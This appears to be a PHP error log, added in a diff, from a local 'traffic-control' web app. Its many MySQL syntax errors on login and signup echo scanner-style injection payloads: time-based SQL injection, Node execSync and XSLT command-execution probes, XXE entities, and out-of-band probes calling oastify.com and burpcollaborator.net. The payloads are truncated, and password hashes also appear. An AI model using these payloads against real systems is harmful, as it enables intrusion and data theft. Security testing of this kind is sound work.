+#0 D:\Apps\OSPanel\home\traffic-control.local\src\server\database.php(74): mysqli->query('SELECT * FROM u...')
+#1 D:\Apps\OSPanel\home\traffic-control.local\src\models\User.php(63): Database::select('user', Array)
+#2 D:\Apps\OSPanel\home\traffic-control.local\src\controllers\UserController.php(21): User::where(Array)
+#3 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(36): UserController::login()
+#4 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(43): Router::resolve()
+#5 {main}
+POST /user/login
+You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'get-help' AND password = '3f6fb401e4d3e5c2c9043775361303e25ebc1da0'' at line 1
+#0 D:\Apps\OSPanel\home\traffic-control.local\src\server\database.php(74): mysqli->query('SELECT * FROM u...')
+#1 D:\Apps\OSPanel\home\traffic-control.local\src\models\User.php(63): Database::select('user', Array)
+#2 D:\Apps\OSPanel\home\traffic-control.local\src\controllers\UserController.php(21): User::where(Array)
+#3 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(36): UserController::login()
+#4 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(43): Router::resolve()
+#5 {main}
+POST /user/login
+You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'start-sleep -s 15.0' AND password = '3f6fb401e4d3e5c2c9043775361303e25ebc1da0'' at line 1
+#0 D:\Apps\OSPanel\home\traffic-control.local\src\server\database.php(74): mysqli->query('SELECT * FROM u...')
+#1 D:\Apps\OSPanel\home\traffic-control.local\src\models\User.php(63): Database::select('user', Array)
+#2 D:\Apps\OSPanel\home\traffic-control.local\src\controllers\UserController.php(21): User::where(Array)
+#3 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(36): UserController::login()
+#4 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(43): Router::resolve()
+#5 {main}
+POST /user/login
+You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '3f6fb401e4d3e5c2c9043775361303e25ebc1da0'' at line 1
+#0 D:\Apps\OSPanel\home\traffic-control.local\src\server\database.php(74): mysqli->query('SELECT * FROM u...')
+#1 D:\Apps\OSPanel\home\traffic-control.local\src\models\User.php(63): Database::select('user', Array)
+#2 D:\Apps\OSPanel\home\traffic-control.local\src\controllers\UserController.php(21): User::where(Array)
+#3 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(36): UserController::login()
+#4 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(43): Router::resolve()
+#5 {main}
+POST /user/login
+You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'child_process').execSync('sleep 15').toString() }}' AND password = '3f6fb401e4d3' at line 1
+#0 D:\Apps\OSPanel\home\traffic-control.local\src\server\database.php(74): mysqli->query('SELECT * FROM u...')
+#1 D:\Apps\OSPanel\home\traffic-control.local\src\models\User.php(63): Database::select('user', Array)
+#2 D:\Apps\OSPanel\home\traffic-control.local\src\controllers\UserController.php(21): User::where(Array)
+#3 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(36): UserController::login()
+#4 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(43): Router::resolve()
+#5 {main}
+POST /user/login
+You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'child_process').execSync('sleep 15').toString()%>' AND password = '3f6fb401e4d3e' at line 1
+#0 D:\Apps\OSPanel\home\traffic-control.local\src\server\database.php(74): mysqli->query('SELECT * FROM u...')
+#1 D:\Apps\OSPanel\home\traffic-control.local\src\models\User.php(63): Database::select('user', Array)
+#2 D:\Apps\OSPanel\home\traffic-control.local\src\controllers\UserController.php(21): User::where(Array)
+#3 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(36): UserController::login()
+#4 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(43): Router::resolve()
+#5 {main}
+POST /user/login
+You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'child_process').execSync('sleep 15').toString()}' AND password = '3f6fb401e4d3e5' at line 1
+#0 D:\Apps\OSPanel\home\traffic-control.local\src\server\database.php(74): mysqli->query('SELECT * FROM u...')
+#1 D:\Apps\OSPanel\home\traffic-control.local\src\models\User.php(63): Database::select('user', Array)
+#2 D:\Apps\OSPanel\home\traffic-control.local\src\controllers\UserController.php(21): User::where(Array)
+#3 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(36): UserController::login()
+#4 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(43): Router::resolve()
+#5 {main}
+POST /user/login
+You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'child_process').execSync('sleep 15').toString()\")")()}}' AND password = '3f6fb4' at line 1
+#0 D:\Apps\OSPanel\home\traffic-control.local\src\server\database.php(74): mysqli->query('SELECT * FROM u...')
+#1 D:\Apps\OSPanel\home\traffic-control.local\src\models\User.php(63): Database::select('user', Array)
+#2 D:\Apps\OSPanel\home\traffic-control.local\src\controllers\UserController.php(21): User::where(Array)
+#3 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(36): UserController::login()
+#4 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(43): Router::resolve()
+#5 {main}
+POST /user/login
+You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'xsl:vendor')"/>' AND password = '3f6fb401e4d3e5c2c9043775361303e25ebc1da0'' at line 1
+#0 D:\Apps\OSPanel\home\traffic-control.local\src\server\database.php(74): mysqli->query('SELECT * FROM u...')
+#1 D:\Apps\OSPanel\home\traffic-control.local\src\models\User.php(63): Database::select('user', Array)
+#2 D:\Apps\OSPanel\home\traffic-control.local\src\controllers\UserController.php(21): User::where(Array)
+#3 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(36): UserController::login()
+#4 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(43): Router::resolve()
+#5 {main}
+POST /user/login
+You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'xsl:vendor')/>' AND password = '3f6fb401e4d3e5c2c9043775361303e25ebc1da0'' at line 1
+#0 D:\Apps\OSPanel\home\traffic-control.local\src\server\database.php(74): mysqli->query('SELECT * FROM u...')
+#1 D:\Apps\OSPanel\home\traffic-control.local\src\models\User.php(63): Database::select('user', Array)
+#2 D:\Apps\OSPanel\home\traffic-control.local\src\controllers\UserController.php(21): User::where(Array)
+#3 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(36): UserController::login()
+#4 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(43): Router::resolve()
+#5 {main}
+POST /user/login
+You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'xsl:vendor')"/><!--' AND password = '3f6fb401e4d3e5c2c9043775361303e25ebc1da0'' at line 1
+#0 D:\Apps\OSPanel\home\traffic-control.local\src\server\database.php(74): mysqli->query('SELECT * FROM u...')
+#1 D:\Apps\OSPanel\home\traffic-control.local\src\models\User.php(63): Database::select('user', Array)
+#2 D:\Apps\OSPanel\home\traffic-control.local\src\controllers\UserController.php(21): User::where(Array)
+#3 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(36): UserController::login()
+#4 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(43): Router::resolve()
+#5 {main}
+POST /user/login
+You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'xsl:vendor')"/><!--' AND password = '3f6fb401e4d3e5c2c9043775361303e25ebc1da0'' at line 1
+#0 D:\Apps\OSPanel\home\traffic-control.local\src\server\database.php(74): mysqli->query('SELECT * FROM u...')
+#1 D:\Apps\OSPanel\home\traffic-control.local\src\models\User.php(63): Database::select('user', Array)
+#2 D:\Apps\OSPanel\home\traffic-control.local\src\controllers\UserController.php(21): User::where(Array)
+#3 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(36): UserController::login()
+#4 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(43): Router::resolve()
+#5 {main}
+POST /user/login
+You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'http://traffic-control.local:22')"/>' AND password = '3f6fb401e4d3e5c2c904377536' at line 1
+#0 D:\Apps\OSPanel\home\traffic-control.local\src\server\database.php(74): mysqli->query('SELECT * FROM u...')
+#1 D:\Apps\OSPanel\home\traffic-control.local\src\models\User.php(63): Database::select('user', Array)
+#2 D:\Apps\OSPanel\home\traffic-control.local\src\controllers\UserController.php(21): User::where(Array)
+#3 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(36): UserController::login()
+#4 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(43): Router::resolve()
+#5 {main}
+POST /user/login
+You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'erroneous_command')"/>
+<xsl:variable name="waiting" select="process:waitFor($pro' at line 2
+#0 D:\Apps\OSPanel\home\traffic-control.local\src\server\database.php(74): mysqli->query('SELECT * FROM u...')
+#1 D:\Apps\OSPanel\home\traffic-control.local\src\models\User.php(63): Database::select('user', Array)
+#2 D:\Apps\OSPanel\home\traffic-control.local\src\controllers\UserController.php(21): User::where(Array)
+#3 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(36): UserController::login()
+#4 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(43): Router::resolve()
+#5 {main}
+POST /user/login
+You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'exec','erroneous_command 2>&amp;1')"/>' AND password = '3f6fb401e4d3e5c2c9043775' at line 1
+#0 D:\Apps\OSPanel\home\traffic-control.local\src\server\database.php(74): mysqli->query('SELECT * FROM u...')
+#1 D:\Apps\OSPanel\home\traffic-control.local\src\models\User.php(63): Database::select('user', Array)
+#2 D:\Apps\OSPanel\home\traffic-control.local\src\controllers\UserController.php(21): User::where(Array)
+#3 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(36): UserController::login()
+#4 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(43): Router::resolve()
+#5 {main}
+POST /user/signup
+You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % ogbhc SYSTEM "h' at line 1
+#0 D:\Apps\OSPanel\home\traffic-control.local\src\server\database.php(74): mysqli->query('SELECT * FROM u...')
+#1 D:\Apps\OSPanel\home\traffic-control.local\src\models\User.php(63): Database::select('user', Array)
+#2 D:\Apps\OSPanel\home\traffic-control.local\src\controllers\UserController.php(153): User::where(Array)
+#3 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(36): UserController::signup()
+#4 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(43): Router::resolve()
+#5 {main}
+POST /user/login
+You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % ltabs SYSTEM "h' at line 1
+#0 D:\Apps\OSPanel\home\traffic-control.local\src\server\database.php(74): mysqli->query('SELECT * FROM u...')
+#1 D:\Apps\OSPanel\home\traffic-control.local\src\models\User.php(63): Database::select('user', Array)
+#2 D:\Apps\OSPanel\home\traffic-control.local\src\controllers\UserController.php(21): User::where(Array)
+#3 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(36): UserController::login()
+#4 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(43): Router::resolve()
+#5 {main}
+POST /user/signup
+FUNCTION traffic_control.xmltype does not exist
+#0 D:\Apps\OSPanel\home\traffic-control.local\src\server\database.php(74): mysqli->query('SELECT * FROM u...')
+#1 D:\Apps\OSPanel\home\traffic-control.local\src\models\User.php(63): Database::select('user', Array)
+#2 D:\Apps\OSPanel\home\traffic-control.local\src\controllers\UserController.php(153): User::where(Array)
+#3 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(36): UserController::signup()
+#4 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(43): Router::resolve()
+#5 {main}
+POST /user/login
+FUNCTION traffic_control.xmltype does not exist
+#0 D:\Apps\OSPanel\home\traffic-control.local\src\server\database.php(74): mysqli->query('SELECT * FROM u...')
+#1 D:\Apps\OSPanel\home\traffic-control.local\src\models\User.php(63): Database::select('user', Array)
+#2 D:\Apps\OSPanel\home\traffic-control.local\src\controllers\UserController.php(21): User::where(Array)
+#3 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(36): UserController::login()
+#4 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(43): Router::resolve()
+#5 {main}
+POST /user/signup
+You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '\\r91a97b978ohi2obm9zachgquh0bo1cs2gu3kr9.oasti'+'fy.com\vkk'; exec master.dbo.x' at line 1
+#0 D:\Apps\OSPanel\home\traffic-control.local\src\server\database.php(74): mysqli->query('SELECT * FROM u...')
+#1 D:\Apps\OSPanel\home\traffic-control.local\src\models\User.php(63): Database::select('user', Array)
+#2 D:\Apps\OSPanel\home\traffic-control.local\src\controllers\UserController.php(153): User::where(Array)
+#3 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(36): UserController::signup()
+#4 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(43): Router::resolve()
+#5 {main}
+POST /user/login
+You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '\\t82c89ab6anjh4ndlbycbjfstjzdn9b01otbjz8.oasti'+'fy.com\yqx'; exec master.dbo.x' at line 1
+#0 D:\Apps\OSPanel\home\traffic-control.local\src\server\database.php(74): mysqli->query('SELECT * FROM u...')
+#1 D:\Apps\OSPanel\home\traffic-control.local\src\models\User.php(63): Database::select('user', Array)
+#2 D:\Apps\OSPanel\home\traffic-control.local\src\controllers\UserController.php(21): User::where(Array)
+#3 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(36): UserController::login()
+#4 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(43): Router::resolve()
+#5 {main}
+POST /user/login
+You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % kgebm SYSTEM "h' at line 1
+#0 D:\Apps\OSPanel\home\traffic-control.local\src\server\database.php(74): mysqli->query('SELECT * FROM u...')
+#1 D:\Apps\OSPanel\home\traffic-control.local\src\models\User.php(63): Database::select('user', Array)
+#2 D:\Apps\OSPanel\home\traffic-control.local\src\controllers\UserController.php(21): User::where(Array)
+#3 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(36): UserController::login()
+#4 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(43): Router::resolve()
+#5 {main}
+POST /user/signup
+You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'declare @q varchar(99);set @q='\\ji52izk1g0x9rux3v182l9pi3993xtlkc84vujj.oasti'+' at line 1
+#0 D:\Apps\OSPanel\home\traffic-control.local\src\server\database.php(74): mysqli->query('SELECT * FROM u...')
+#1 D:\Apps\OSPanel\home\traffic-control.local\src\models\User.php(63): Database::select('user', Array)
+#2 D:\Apps\OSPanel\home\traffic-control.local\src\controllers\UserController.php(153): User::where(Array)
+#3 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(36): UserController::signup()
+#4 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(43): Router::resolve()
+#5 {main}
+POST /user/login
+You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'declare @q varchar(99);set @q='\\tc9cc9ebaarjl4rdpb2cfjjsxj3dr9f06oybozd.oasti'+' at line 1
+#0 D:\Apps\OSPanel\home\traffic-control.local\src\server\database.php(74): mysqli->query('SELECT * FROM u...')
+#1 D:\Apps\OSPanel\home\traffic-control.local\src\models\User.php(63): Database::select('user', Array)
+#2 D:\Apps\OSPanel\home\traffic-control.local\src\controllers\UserController.php(21): User::where(Array)
+#3 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(36): UserController::login()
+#4 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(43): Router::resolve()
+#5 {main}
+POST /user/login
+FUNCTION traffic_control.xmltype does not exist
+#0 D:\Apps\OSPanel\home\traffic-control.local\src\server\database.php(74): mysqli->query('SELECT * FROM u...')
+#1 D:\Apps\OSPanel\home\traffic-control.local\src\models\User.php(63): Database::select('user', Array)
+#2 D:\Apps\OSPanel\home\traffic-control.local\src\controllers\UserController.php(21): User::where(Array)
+#3 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(36): UserController::login()
+#4 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(43): Router::resolve()
+#5 {main}
+POST /user/signup
+You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '\\agutgqiserv0plvuts6tj0n9107uvkjbbz3mtai.oasti'+'fy.com\qzp'; exec master.dbo.x' at line 1
+#0 D:\Apps\OSPanel\home\traffic-control.local\src\server\database.php(74): mysqli->query('SELECT * FROM u...')
+#1 D:\Apps\OSPanel\home\traffic-control.local\src\models\User.php(63): Database::select('user', Array)
+#2 D:\Apps\OSPanel\home\traffic-control.local\src\controllers\UserController.php(153): User::where(Array)
+#3 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(36): UserController::signup()
+#4 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(43): Router::resolve()
+#5 {main}
+POST /user/login
+You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '\\s0tb082ay9fi93fcdaqb3i7rlircf83zvnnady2.oasti'+'fy.com\gxs'; exec master.dbo.x' at line 1
+#0 D:\Apps\OSPanel\home\traffic-control.local\src\server\database.php(74): mysqli->query('SELECT * FROM u...')
+#1 D:\Apps\OSPanel\home\traffic-control.local\src\models\User.php(63): Database::select('user', Array)
+#2 D:\Apps\OSPanel\home\traffic-control.local\src\controllers\UserController.php(21): User::where(Array)
+#3 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(36): UserController::login()
+#4 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(43): Router::resolve()
+#5 {main}
+POST /user/login
+You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '\\ig21gyi0ezv8ptv2t061j8nh1872v2jt9h14rsg.oasti'+'fy.com\iow'; exec master.dbo.x' at line 1
+#0 D:\Apps\OSPanel\home\traffic-control.local\src\server\database.php(74): mysqli->query('SELECT * FROM u...')
+#1 D:\Apps\OSPanel\home\traffic-control.local\src\models\User.php(63): Database::select('user', Array)
+#2 D:\Apps\OSPanel\home\traffic-control.local\src\controllers\UserController.php(21): User::where(Array)
+#3 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(36): UserController::login()
+#4 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(43): Router::resolve()
+#5 {main}
+POST /user/signup
+You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ');declare @q varchar(99);set @q='\\hn80nxpzly27ws210zd0q7ug87e12rqij6bt1hq.oasti' at line 1
+#0 D:\Apps\OSPanel\home\traffic-control.local\src\server\database.php(74): mysqli->query('SELECT * FROM u...')
+#1 D:\Apps\OSPanel\home\traffic-control.local\src\models\User.php(63): Database::select('user', Array)
+#2 D:\Apps\OSPanel\home\traffic-control.local\src\controllers\UserController.php(153): User::where(Array)
+#3 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(36): UserController::signup()
+#4 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(43): Router::resolve()
+#5 {main}
+POST /user/login
+You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ');declare @q varchar(99);set @q='\\tb8cb9db9aqjk4qdob1cejiswj2dq9e07ozbpze.oasti' at line 1
+#0 D:\Apps\OSPanel\home\traffic-control.local\src\server\database.php(74): mysqli->query('SELECT * FROM u...')
+#1 D:\Apps\OSPanel\home\traffic-control.local\src\models\User.php(63): Database::select('user', Array)
+#2 D:\Apps\OSPanel\home\traffic-control.local\src\controllers\UserController.php(21): User::where(Array)
+#3 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(36): UserController::login()
+#4 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(43): Router::resolve()
+#5 {main}
+POST /user/login
+You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'declare @q varchar(99);set @q='\\pvo8v5x7t6af40a987l8yf2ogfm9a9y0pohb7zw.oasti'+' at line 1
+#0 D:\Apps\OSPanel\home\traffic-control.local\src\server\database.php(74): mysqli->query('SELECT * FROM u...')
+#1 D:\Apps\OSPanel\home\traffic-control.local\src\models\User.php(63): Database::select('user', Array)
+#2 D:\Apps\OSPanel\home\traffic-control.local\src\controllers\UserController.php(21): User::where(Array)
+#3 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(36): UserController::login()
+#4 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(43): Router::resolve()
+#5 {main}
+POST /user/signup
+You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '\\\\xstgsdufqe7n187h5figvnzwdnjh77vyxmp9fx4.oastify.com\\ikf'))'' at line 1
+#0 D:\Apps\OSPanel\home\traffic-control.local\src\server\database.php(74): mysqli->query('SELECT * FROM u...')
+#1 D:\Apps\OSPanel\home\traffic-control.local\src\models\User.php(63): Database::select('user', Array)
+#2 D:\Apps\OSPanel\home\traffic-control.local\src\controllers\UserController.php(153): User::where(Array)
+#3 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(36): UserController::signup()
+#4 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(43): Router::resolve()
+#5 {main}
+POST /user/login
+You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '\\\\wiifickegdxmr7xgve8flmpv3m9gxcl3nrfe52u.oastify.com\\hah'))' AND password = ' at line 1
+#0 D:\Apps\OSPanel\home\traffic-control.local\src\server\database.php(74): mysqli->query('SELECT * FROM u...')
+#1 D:\Apps\OSPanel\home\traffic-control.local\src\models\User.php(63): Database::select('user', Array)
+#2 D:\Apps\OSPanel\home\traffic-control.local\src\controllers\UserController.php(21): User::where(Array)
+#3 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(36): UserController::login()
+#4 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(43): Router::resolve()
+#5 {main}
+POST /user/login
+You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '\\6y5pym0owndw7hdqboop1w55jwpqdq1ht5lsbg0.oasti'+'fy.com\ihu'; exec master.dbo.x' at line 1
+#0 D:\Apps\OSPanel\home\traffic-control.local\src\server\database.php(74): mysqli->query('SELECT * FROM u...')
+#1 D:\Apps\OSPanel\home\traffic-control.local\src\models\User.php(63): Database::select('user', Array)
+#2 D:\Apps\OSPanel\home\traffic-control.local\src\controllers\UserController.php(21): User::where(Array)
+#3 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(36): UserController::login()
+#4 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(43): Router::resolve()
+#5 {main}
+POST /user/signup
+Truncated incorrect DOUBLE value: 'LQLCxRcP@burpcollaborator.net'
+#0 D:\Apps\OSPanel\home\traffic-control.local\src\server\database.php(108): mysqli->query('INSERT INTO use...')
+#1 D:\Apps\OSPanel\home\traffic-control.local\src\models\User.php(171): Database::insert('user', Array)
+#2 D:\Apps\OSPanel\home\traffic-control.local\src\controllers\UserController.php(171): User->save()
+#3 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(36): UserController::signup()
+#4 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(43): Router::resolve()
+#5 {main}
+POST /user/login
+You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ');declare @q varchar(99);set @q='\\muk5u2w4s39c3x9674k5xc1lfcl696xxqli88wx.oasti' at line 1
+#0 D:\Apps\OSPanel\home\traffic-control.local\src\server\database.php(74): mysqli->query('SELECT * FROM u...')
+#1 D:\Apps\OSPanel\home\traffic-control.local\src\models\User.php(63): Database::select('user', Array)
+#2 D:\Apps\OSPanel\home\traffic-control.local\src\controllers\UserController.php(21): User::where(Array)
+#3 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(36): UserController::login()
+#4 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(43): Router::resolve()
+#5 {main}
+POST /user/signup
+You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''LQLCxRcP@burpcollaborator.net''' at line 1
+#0 D:\Apps\OSPanel\home\traffic-control.local\src\server\database.php(74): mysqli->query('SELECT * FROM u...')
+#1 D:\Apps\OSPanel\home\traffic-control.local\src\models\User.php(63): Database::select('user', Array)
+#2 D:\Apps\OSPanel\home\traffic-control.local\src\controllers\UserController.php(153): User::where(Array)
+#3 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(36): UserController::signup()
+#4 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(43): Router::resolve()
+#5 {main}
+POST /user/login
+You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'b9b30fd11d532ccb581a42cda889ed27b818b915'' at line 1
+#0 D:\Apps\OSPanel\home\traffic-control.local\src\server\database.php(74): mysqli->query('SELECT * FROM u...')
+#1 D:\Apps\OSPanel\home\traffic-control.local\src\models\User.php(63): Database::select('user', Array)
+#2 D:\Apps\OSPanel\home\traffic-control.local\src\controllers\UserController.php(21): User::where(Array)
+#3 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(36): UserController::login()
+#4 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(43): Router::resolve()
+#5 {main}
+POST /user/login
+You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '\\\\j8s28za160n9hun3l1y2b9fit9z3n3budi55vtk.oastify.com\\erq'))' AND password = ' at line 1
+#0 D:\Apps\OSPanel\home\traffic-control.local\src\server\database.php(74): mysqli->query('SELECT * FROM u...')
+#1 D:\Apps\OSPanel\home\traffic-control.local\src\models\User.php(63): Database::select('user', Array)
+#2 D:\Apps\OSPanel\home\traffic-control.local\src\controllers\UserController.php(21): User::where(Array)
+#3 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(36): UserController::login()
+#4 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(43): Router::resolve()
+#5 {main}
+POST /user/signup
+You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''LQLCxRcP@burpcollaborator.net''' at line 1
+#0 D:\Apps\OSPanel\home\traffic-control.local\src\server\database.php(74): mysqli->query('SELECT * FROM u...')
+#1 D:\Apps\OSPanel\home\traffic-control.local\src\models\User.php(63): Database::select('user', Array)
+#2 D:\Apps\OSPanel\home\traffic-control.local\src\controllers\UserController.php(153): User::where(Array)
+#3 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(36): UserController::signup()
+#4 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(43): Router::resolve()
+#5 {main}
+POST /user/login
+You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'b9b30fd11d532ccb581a42cda889ed27b818b915'' at line 1
+#0 D:\Apps\OSPanel\home\traffic-control.local\src\server\database.php(74): mysqli->query('SELECT * FROM u...')
+#1 D:\Apps\OSPanel\home\traffic-control.local\src\models\User.php(63): Database::select('user', Array)
+#2 D:\Apps\OSPanel\home\traffic-control.local\src\controllers\UserController.php(21): User::where(Array)
+#3 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(36): UserController::login()
+#4 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(43): Router::resolve()
+#5 {main}
+POST /user/login
+You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '9324f0e673cdb228326972c7d9742340bd73b0e6'' at line 1
+#0 D:\Apps\OSPanel\home\traffic-control.local\src\server\database.php(74): mysqli->query('SELECT * FROM u...')
+#1 D:\Apps\OSPanel\home\traffic-control.local\src\models\User.php(63): Database::select('user', Array)
+#2 D:\Apps\OSPanel\home\traffic-control.local\src\controllers\UserController.php(21): User::where(Array)
+#3 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(36): UserController::login()
+#4 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(43): Router::resolve()
+#5 {main}
+POST /user/login
+You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '9324f0e673cdb228326972c7d9742340bd73b0e6'' at line 1
+#0 D:\Apps\OSPanel\home\traffic-control.local\src\server\database.php(74): mysqli->query('SELECT * FROM u...')
+#1 D:\Apps\OSPanel\home\traffic-control.local\src\models\User.php(63): Database::select('user', Array)
+#2 D:\Apps\OSPanel\home\traffic-control.local\src\controllers\UserController.php(21): User::where(Array)
+#3 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(36): UserController::login()
+#4 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(43): Router::resolve()
+#5 {main}
+POST /user/signup
+You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '(select*from(select(sleep(20)))a)''' at line 1
+#0 D:\Apps\OSPanel\home\traffic-control.local\src\server\database.php(74): mysqli->query('SELECT * FROM u...')
+#1 D:\Apps\OSPanel\home\traffic-control.local\src\models\User.php(63): Database::select('user', Array)
+#2 D:\Apps\OSPanel\home\traffic-control.local\src\controllers\UserController.php(153): User::where(Array)
+#3 D:\Apps\OSPanel\home\traffic-control.local\src\server\router.php(36): UserController::signup()
